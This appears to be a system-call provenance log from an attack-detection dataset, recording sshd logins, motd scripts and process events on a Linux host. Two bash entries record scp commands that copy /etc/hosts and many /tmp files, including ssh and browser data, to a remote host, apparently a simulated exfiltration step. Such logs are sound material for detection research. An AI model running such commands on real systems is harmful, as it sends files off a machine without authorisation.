1557958656.646:1979212619,2B4CD5DA-B5DC-4F0E-B2A7-9B0F906FE56F:95-hwe-eol,EXECUTE,2C7F30EC-C6EA-A02B-70BB-31E09CC6924C,update-motd-hwe,ta1-trace-2
1557958656.646:1979212596,0D20C693-0A42-1D65-74B8-F82B01E85C05:run-parts,EXECUTE,2B4CD5DA-B5DC-4F0E-B2A7-9B0F906FE56F,95-hwe-eol,ta1-trace-2
1557958656.646:1979212594,9AB32B39-1C51-4287-F48C-AAF8F597305F:run-parts,FORK,0D20C693-0A42-1D65-74B8-F82B01E85C05,run-parts,ta1-trace-2
1557958656.626:1979212223,6F879828-D190-A340-4280-29CBDF1C5C3D:lsb_release,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958656.614:1979211964,6AEF889E-101F-CE71-823E-0A324D609796:91-release-upgr,EXECUTE,6F879828-D190-A340-4280-29CBDF1C5C3D,lsb_release,ta1-trace-2
1557958656.614:1979211955,E10DB0C0-DC6D-A2DE-7C56-D7F8AC41AB9B:91-release-upgr,FORK,6AEF889E-101F-CE71-823E-0A324D609796,91-release-upgr,ta1-trace-2
1557958656.614:1979211948,65C16C6E-5B60-4DC1-1510-D49F286413DF:91-release-upgr,FORK,E10DB0C0-DC6D-A2DE-7C56-D7F8AC41AB9B,91-release-upgr,ta1-trace-2
1557958656.614:1979211926,5707DA89-9B98-2BBC-2748-2FE47BAB5A5C:run-parts,EXECUTE,65C16C6E-5B60-4DC1-1510-D49F286413DF,91-release-upgr,ta1-trace-2
1557958656.614:1979211925,9AB32B39-1C51-4287-F48C-AAF8F597305F:run-parts,FORK,5707DA89-9B98-2BBC-2748-2FE47BAB5A5C,run-parts,ta1-trace-2
1557958656.614:1979211899,7EB97645-374A-4F92-6053-35DFC6B2C0EA:update-motd-upd,EXECUTE,9662FB0D-FB19-B9F6-D1BD-B870C0C45716,cat,ta1-trace-2
1557958656.614:1979211897,95897768-2765-5242-E2C8-B654AB576E0E:update-motd-upd,FORK,7EB97645-374A-4F92-6053-35DFC6B2C0EA,update-motd-upd,ta1-trace-2
1557958656.598:1979210832,94EFE19F-3CBF-3B2D-BF85-F49A9B0BEE27:90-updates-avai,EXECUTE,95897768-2765-5242-E2C8-B654AB576E0E,update-motd-upd,ta1-trace-2
1557958656.598:1979210806,B966D139-EDA9-A019-508B-C63B3B96E962:run-parts,EXECUTE,94EFE19F-3CBF-3B2D-BF85-F49A9B0BEE27,90-updates-avai,ta1-trace-2
1557958656.598:1979210805,9AB32B39-1C51-4287-F48C-AAF8F597305F:run-parts,FORK,B966D139-EDA9-A019-508B-C63B3B96E962,run-parts,ta1-trace-2
1557958656.470:1979203607,E702E554-F8F2-48A2-2C44-302520AF5ABC:landscape-sysin,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958656.462:1979203189,059799C0-C4E7-BB9D-E63D-92EE206053CE:50-landscape-sy,EXECUTE,E702E554-F8F2-48A2-2C44-302520AF5ABC,landscape-sysin,ta1-trace-2
1557958656.462:1979203182,BC8E10AF-9CAC-4437-5788-AB7B2A7BDBC8:50-landscape-sy,FORK,059799C0-C4E7-BB9D-E63D-92EE206053CE,50-landscape-sy,ta1-trace-2
1557958656.458:1979202870,C9185478-BB88-5278-580D-CD4BDDB2B310:run-parts,EXECUTE,BC8E10AF-9CAC-4437-5788-AB7B2A7BDBC8,50-landscape-sy,ta1-trace-2
1557958656.458:1979202857,9AB32B39-1C51-4287-F48C-AAF8F597305F:run-parts,FORK,C9185478-BB88-5278-580D-CD4BDDB2B310,run-parts,ta1-trace-2
1557958656.454:1979202553,D1D68708-0C32-F65A-56DB-CF2A777362BF:env,EXECUTE,9AB32B39-1C51-4287-F48C-AAF8F597305F,run-parts,ta1-trace-2
1557958656.454:1979202517,6CCAEE61-2AD7-47C3-7354-A1C3155C6395:sh,EXECUTE,D1D68708-0C32-F65A-56DB-CF2A777362BF,env,ta1-trace-2
1557958656.454:1979202505,A82A2922-7E32-D707-A850-E9B8BC5285A4:sh,FORK,6CCAEE61-2AD7-47C3-7354-A1C3155C6395,sh,ta1-trace-2
1557958656.454:1979202453,738B9E05-39A4-B3FE-13A3-C96AB686C006:sshd,EXECUTE,A82A2922-7E32-D707-A850-E9B8BC5285A4,sh,ta1-trace-2
1557958656.454:1979202435,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,FORK,738B9E05-39A4-B3FE-13A3-C96AB686C006,sshd,ta1-trace-2
1557958656.454:1979202415,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958656.434:1979202027,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958656.434:1979201975,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958656.434:1979201963,3BFB5F85-9B6C-2CD2-2BEA-7ACCB6704349:sshd,CHANGE_PRINCIPAL,ECACDB44-F81B-D6BF-C2C2-2834992A40FA,sshd,ta1-trace-2
1557958656.434:1979201962,C7B04115-513B-19D5-94EF-A2CC6B522E7B:sshd,CHANGE_PRINCIPAL,3BFB5F85-9B6C-2CD2-2BEA-7ACCB6704349,sshd,ta1-trace-2
1557958656.434:1979201961,3BFB5F85-9B6C-2CD2-2BEA-7ACCB6704349:sshd,CHANGE_PRINCIPAL,C7B04115-513B-19D5-94EF-A2CC6B522E7B,sshd,ta1-trace-2
1557958656.434:1979201960,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,CHANGE_PRINCIPAL,3BFB5F85-9B6C-2CD2-2BEA-7ACCB6704349,sshd,ta1-trace-2
1557958656.434:1979201958,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958656.434:1979201944,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958656.434:1979201904,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557958656.434:1979201901,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958656.430:1979201876,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557958656.430:1979201873,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958656.326:1979201478,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958656.326:1979201446,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557958656.326:1979201445,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557958656.234:1979201079,ECACDB44-F81B-D6BF-C2C2-2834992A40FA:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958656.226:1979200805,3F01F87C-AB17-7203-33BB-D910D4420CA6:sshd,EXECUTE,ECACDB44-F81B-D6BF-C2C2-2834992A40FA,sshd,ta1-trace-2
1557958656.226:1979200781,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,3F01F87C-AB17-7203-33BB-D910D4420CA6,sshd,ta1-trace-2
1557958652.070:1979190788,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958652.070:1979190741,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958652.070:1979190646,586AFC0E-C8C2-6FB2-C290-265F13F61AC8:sshd,CHANGE_PRINCIPAL,6642630D-A61F-08C4-1B34-123FA6771796,sshd,ta1-trace-2
1557958652.070:1979190645,586AFC0E-C8C2-6FB2-C290-265F13F61AC8:sshd,CHANGE_PRINCIPAL,586AFC0E-C8C2-6FB2-C290-265F13F61AC8,sshd,ta1-trace-2
1557958652.070:1979190644,6642630D-A61F-08C4-1B34-123FA6771796:sshd,CHANGE_PRINCIPAL,586AFC0E-C8C2-6FB2-C290-265F13F61AC8,sshd,ta1-trace-2
1557958650.958:1979188088,44851902-40D8-B183-A543-BB962EEF024D:scp,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557958650.470:1979187220,E35AD21F-9BBD-6D3F-3CB1-70D33DE06375:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958650.470:1979187217,E35AD21F-9BBD-6D3F-3CB1-70D33DE06375:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958650.470:1979187214,E35AD21F-9BBD-6D3F-3CB1-70D33DE06375:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958650.470:1979187211,E35AD21F-9BBD-6D3F-3CB1-70D33DE06375:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958650.470:1979187208,E35AD21F-9BBD-6D3F-3CB1-70D33DE06375:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958650.470:1979187205,E35AD21F-9BBD-6D3F-3CB1-70D33DE06375:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958650.470:1979187202,E35AD21F-9BBD-6D3F-3CB1-70D33DE06375:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958650.470:1979187180,E35AD21F-9BBD-6D3F-3CB1-70D33DE06375:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958650.466:1979187077,BE37279A-BA3A-8C84-6CA1-3A426547A4D7:scp,EXECUTE,E35AD21F-9BBD-6D3F-3CB1-70D33DE06375,ssh,ta1-trace-2
1557958650.466:1979187066,44851902-40D8-B183-A543-BB962EEF024D:scp,FORK,BE37279A-BA3A-8C84-6CA1-3A426547A4D7,scp,ta1-trace-2
1557958650.466:1979187058,44851902-40D8-B183-A543-BB962EEF024D:scp,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958650.466:1979186989,F1E53B97-F343-6CD0-D713-C08BE400AFA3:bash,EXECUTE,44851902-40D8-B183-A543-BB962EEF024D,b'scp -r /etc/hosts admin@128.55.12.78:./docs/',ta1-trace-2
1557958650.462:1979186983,30CEB50A-2FCB-0DE3-E886-1FAF5EED4E6B:bash,FORK,F1E53B97-F343-6CD0-D713-C08BE400AFA3,bash,ta1-trace-2
1557958645.830:1979175586,72EC9C9B-7AF0-6D83-23C6-49C9B8740F53:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.830:1979175583,72EC9C9B-7AF0-6D83-23C6-49C9B8740F53:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.830:1979175580,72EC9C9B-7AF0-6D83-23C6-49C9B8740F53:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.830:1979175577,72EC9C9B-7AF0-6D83-23C6-49C9B8740F53:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.830:1979175574,72EC9C9B-7AF0-6D83-23C6-49C9B8740F53:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.830:1979175571,72EC9C9B-7AF0-6D83-23C6-49C9B8740F53:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.830:1979175568,72EC9C9B-7AF0-6D83-23C6-49C9B8740F53:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.826:1979175546,72EC9C9B-7AF0-6D83-23C6-49C9B8740F53:ssh,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.826:1979175451,C68BEC65-B2D3-ED13-06B2-E82F29125C6B:scp,EXECUTE,72EC9C9B-7AF0-6D83-23C6-49C9B8740F53,ssh,ta1-trace-2
1557958645.826:1979175442,DAB5C713-20DF-9859-F990-EBBF67AF2F60:scp,FORK,C68BEC65-B2D3-ED13-06B2-E82F29125C6B,scp,ta1-trace-2
1557958645.826:1979175435,DAB5C713-20DF-9859-F990-EBBF67AF2F60:scp,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.826:1979175374,CABE52D6-CF52-EF6A-8E50-3A3A2613830F:bash,EXECUTE,DAB5C713-20DF-9859-F990-EBBF67AF2F60,b'scp -r /tmp/admiredly /tmp/belier /tmp/betulinic /tmp/diglottism /tmp/dystonias /tmp/firefox_admin /tmp/firefox_root /tmp/ghazis /tmp/grains /tmp/hsperfdata_darpa /tmp/kleptomanist /tmp/matrilinear /tmp/misy /tmp/mozilla_admin0 /tmp/MozillaMailnews /tmp/papists /tmp/poot /tmp/ssh-Q1Lt0fJdysyl /tmp/ssh-weL2TqO0XtQu /tmp/stalled /tmp/syconate /tmp/thetine admin@128.55.12.78:./docs/',ta1-trace-2
1557958645.826:1979175368,30CEB50A-2FCB-0DE3-E886-1FAF5EED4E6B:bash,FORK,CABE52D6-CF52-EF6A-8E50-3A3A2613830F,bash,ta1-trace-2
1557958645.634:1979172262,30CEB50A-2FCB-0DE3-E886-1FAF5EED4E6B:bash,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.634:1979172179,28372E65-3F39-C30C-18DB-CA89FF91D9C2:sshd,EXECUTE,30CEB50A-2FCB-0DE3-E886-1FAF5EED4E6B,bash,ta1-trace-2
1557958645.630:1979172066,866FCB8F-CF26-13F8-1F98-7B17D71CD8DE:sshd,FORK,28372E65-3F39-C30C-18DB-CA89FF91D9C2,sshd,ta1-trace-2
1557958645.630:1979172014,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.630:1979172008,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.630:1979171985,C48AFFE2-43DF-E545-BD97-1865F3E9355A:sshd,CHANGE_PRINCIPAL,866FCB8F-CF26-13F8-1F98-7B17D71CD8DE,sshd,ta1-trace-2
1557958645.630:1979171963,A94677BC-EEBA-B300-10D1-42D3187D834D:sshd,CHANGE_PRINCIPAL,C48AFFE2-43DF-E545-BD97-1865F3E9355A,sshd,ta1-trace-2
1557958645.630:1979171960,6642630D-A61F-08C4-1B34-123FA6771796:sshd,FORK,A94677BC-EEBA-B300-10D1-42D3187D834D,sshd,ta1-trace-2
1557958645.630:1979171951,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.630:1979171915,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.630:1979171912,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.630:1979171909,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.626:1979171808,A57AD79A-5C78-3B03-007F-10739CF7B59C:update-motd-fsc,EXECUTE,DC5E20B4-3C9D-288D-FED0-427B60D649C4,cat,ta1-trace-2
1557958645.626:1979171806,9E10EFF7-32AF-0066-1F62-685826DD145E:update-motd-fsc,FORK,A57AD79A-5C78-3B03-007F-10739CF7B59C,update-motd-fsc,ta1-trace-2
1557958645.622:1979171243,4E0D65C6-1FAA-D870-B9DF-F911FB564355:98-fsck-at-rebo,EXECUTE,9E10EFF7-32AF-0066-1F62-685826DD145E,update-motd-fsc,ta1-trace-2
1557958645.622:1979171207,EFFCA263-B569-B16F-BEE9-30C39AA43C6D:run-parts,EXECUTE,4E0D65C6-1FAA-D870-B9DF-F911FB564355,98-fsck-at-rebo,ta1-trace-2
1557958645.622:1979171199,6EEAF375-DE0B-7BB7-8395-78835098C993:run-parts,FORK,EFFCA263-B569-B16F-BEE9-30C39AA43C6D,run-parts,ta1-trace-2
1557958645.622:1979171079,DF1D616A-52F7-AF67-586F-EEDE73168E2B:update-motd-hwe,EXECUTE,DDCB5BF0-8219-5C9E-9AA0-9C8E97498040,cat,ta1-trace-2
1557958645.622:1979171065,CC1803F5-CF63-56E4-D000-FE3F4CE8298B:update-motd-hwe,FORK,DF1D616A-52F7-AF67-586F-EEDE73168E2B,update-motd-hwe,ta1-trace-2
1557958645.598:1979169466,3818B820-B5BD-4C4A-BF40-D0BB9CE8B17B:95-hwe-eol,EXECUTE,CC1803F5-CF63-56E4-D000-FE3F4CE8298B,update-motd-hwe,ta1-trace-2
1557958645.598:1979169443,D190F340-C43D-AE34-4697-CD62FA976A9E:run-parts,EXECUTE,3818B820-B5BD-4C4A-BF40-D0BB9CE8B17B,95-hwe-eol,ta1-trace-2
1557958645.598:1979169438,6EEAF375-DE0B-7BB7-8395-78835098C993:run-parts,FORK,D190F340-C43D-AE34-4697-CD62FA976A9E,run-parts,ta1-trace-2
1557958645.574:1979169053,098DC7CA-F3CB-EF05-32E7-36E7D86499EE:lsb_release,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.562:1979168792,3ABA898D-ADD9-4F1B-203C-3B32A4D8A67C:91-release-upgr,EXECUTE,098DC7CA-F3CB-EF05-32E7-36E7D86499EE,lsb_release,ta1-trace-2
1557958645.562:1979168785,33369501-5A9F-9F55-0977-62C52878BF06:91-release-upgr,FORK,3ABA898D-ADD9-4F1B-203C-3B32A4D8A67C,91-release-upgr,ta1-trace-2
1557958645.562:1979168778,CA42E3BA-E419-344F-7FB9-89FB331C1A91:91-release-upgr,FORK,33369501-5A9F-9F55-0977-62C52878BF06,91-release-upgr,ta1-trace-2
1557958645.562:1979168756,8708C188-CA5A-4E79-FF6F-913E322B914C:run-parts,EXECUTE,CA42E3BA-E419-344F-7FB9-89FB331C1A91,91-release-upgr,ta1-trace-2
1557958645.562:1979168755,6EEAF375-DE0B-7BB7-8395-78835098C993:run-parts,FORK,8708C188-CA5A-4E79-FF6F-913E322B914C,run-parts,ta1-trace-2
1557958645.562:1979168729,C9BE1F31-7BE5-F10D-9992-1B76B3C57366:update-motd-upd,EXECUTE,CF38AA2A-D337-3908-858A-6AEC391B5245,cat,ta1-trace-2
1557958645.558:1979168727,1FA7E230-786A-2FA2-6C1C-0F415B58BE66:update-motd-upd,FORK,C9BE1F31-7BE5-F10D-9992-1B76B3C57366,update-motd-upd,ta1-trace-2
1557958645.538:1979167662,5B7B494B-8AF3-B79B-9854-47D5DCAC42F0:90-updates-avai,EXECUTE,1FA7E230-786A-2FA2-6C1C-0F415B58BE66,update-motd-upd,ta1-trace-2
1557958645.538:1979167636,61F27DFA-86F9-A67D-5B8A-02C46CF32DA6:run-parts,EXECUTE,5B7B494B-8AF3-B79B-9854-47D5DCAC42F0,90-updates-avai,ta1-trace-2
1557958645.538:1979167635,6EEAF375-DE0B-7BB7-8395-78835098C993:run-parts,FORK,61F27DFA-86F9-A67D-5B8A-02C46CF32DA6,run-parts,ta1-trace-2
1557958645.398:1979160426,A97738E4-BA25-DCE4-7030-EAD0078AAD8D:landscape-sysin,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.390:1979160023,1BB772A5-2072-5774-8B3F-4F473172CD8A:50-landscape-sy,EXECUTE,A97738E4-BA25-DCE4-7030-EAD0078AAD8D,landscape-sysin,ta1-trace-2
1557958645.390:1979160021,2C216DA7-2A55-48F2-CAA2-8D0D4E02269B:50-landscape-sy,FORK,1BB772A5-2072-5774-8B3F-4F473172CD8A,50-landscape-sy,ta1-trace-2
1557958645.382:1979159762,626906C7-81FD-1860-FD06-DCE2525B57F5:run-parts,EXECUTE,2C216DA7-2A55-48F2-CAA2-8D0D4E02269B,50-landscape-sy,ta1-trace-2
1557958645.382:1979159761,6EEAF375-DE0B-7BB7-8395-78835098C993:run-parts,FORK,626906C7-81FD-1860-FD06-DCE2525B57F5,run-parts,ta1-trace-2
1557958645.378:1979159409,4D4278BA-22D7-9001-871B-E8E24A25D5C4:env,EXECUTE,6EEAF375-DE0B-7BB7-8395-78835098C993,run-parts,ta1-trace-2
1557958645.378:1979159380,BDE13F34-64FC-09BB-00A8-7F71F6F26A14:sh,EXECUTE,4D4278BA-22D7-9001-871B-E8E24A25D5C4,env,ta1-trace-2
1557958645.378:1979159379,38A57F5B-653D-9374-587C-7D120B9F907C:sh,FORK,BDE13F34-64FC-09BB-00A8-7F71F6F26A14,sh,ta1-trace-2
1557958645.378:1979159341,D3752E90-7D32-0BAA-EFC4-D40306818A6D:sshd,EXECUTE,38A57F5B-653D-9374-587C-7D120B9F907C,sh,ta1-trace-2
1557958645.378:1979159294,6642630D-A61F-08C4-1B34-123FA6771796:sshd,FORK,D3752E90-7D32-0BAA-EFC4-D40306818A6D,sshd,ta1-trace-2
1557958645.378:1979159265,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.354:1979159100,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.354:1979159048,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.354:1979159036,515A173F-677D-10B3-7C46-3B9CB7FF3776:sshd,CHANGE_PRINCIPAL,6642630D-A61F-08C4-1B34-123FA6771796,sshd,ta1-trace-2
1557958645.354:1979159035,C469695D-A630-778C-05D1-674FCC4D8A79:sshd,CHANGE_PRINCIPAL,515A173F-677D-10B3-7C46-3B9CB7FF3776,sshd,ta1-trace-2
1557958645.354:1979159034,515A173F-677D-10B3-7C46-3B9CB7FF3776:sshd,CHANGE_PRINCIPAL,C469695D-A630-778C-05D1-674FCC4D8A79,sshd,ta1-trace-2
1557958645.354:1979159033,6642630D-A61F-08C4-1B34-123FA6771796:sshd,CHANGE_PRINCIPAL,515A173F-677D-10B3-7C46-3B9CB7FF3776,sshd,ta1-trace-2
1557958645.354:1979159031,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.354:1979159017,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.350:1979158975,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557958645.350:1979158971,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.342:1979158930,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557958645.342:1979158927,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.238:1979158533,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.238:1979158501,6642630D-A61F-08C4-1B34-123FA6771796:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557958645.238:1979158500,6642630D-A61F-08C4-1B34-123FA6771796:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557958645.142:1979158136,6642630D-A61F-08C4-1B34-123FA6771796:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958645.134:1979157876,16DDB378-CCAD-C525-2E52-DDD9005D69BE:sshd,EXECUTE,6642630D-A61F-08C4-1B34-123FA6771796,sshd,ta1-trace-2
1557958645.134:1979157855,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,16DDB378-CCAD-C525-2E52-DDD9005D69BE,sshd,ta1-trace-2
1557958621.974:1979114898,DA0665DB-066F-E417-77FA-FC79193D52E7:cron,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958621.974:1979114859,DA0665DB-066F-E417-77FA-FC79193D52E7:cron,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958621.970:1979114814,DA0665DB-066F-E417-77FA-FC79193D52E7:cron,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557958621.970:1979114811,DA0665DB-066F-E417-77FA-FC79193D52E7:cron,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958550.685:1978976727,141B2474-E86B-92A6-DD34-100FEAB6E1DC:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958550.685:1978976711,141B2474-E86B-92A6-DD34-100FEAB6E1DC:sshd,MMAP,C9CC4DEF-EEB7-0345-52E8-ECD2BDE03F86,/etc/passwd,ta1-trace-2
1557958550.685:1978976576,E760D94D-610F-4402-344D-E53731C6D74D:sshd,CHANGE_PRINCIPAL,141B2474-E86B-92A6-DD34-100FEAB6E1DC,sshd,ta1-trace-2
